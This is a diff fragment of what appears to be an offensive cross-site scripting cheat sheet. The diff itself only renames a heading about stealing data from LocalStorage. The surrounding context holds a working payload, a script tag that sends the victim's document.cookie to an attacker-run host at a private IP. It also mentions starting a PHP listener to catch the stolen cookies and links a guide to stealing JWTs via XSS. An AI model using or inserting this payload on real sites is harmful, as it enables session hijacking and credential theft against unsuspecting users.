@@ -12,7 +12,7 @@ php -S xxx.xxx.xxx.xxx:<port>
 <script>new Image().src="http://192.168.0.60/index.php?c="+document.cookie;</script>
 ```
 
-Stealing Sensitive Data from LocalStorage (Untested but looks cool)
+Using XSS to Stealing Sensitive Data from LocalStorage (Untested but looks cool)
 -----------------------
 ```
 # https://medium.com/redteam/stealing-jwts-in-localstorage-via-xss-6048d91378a0
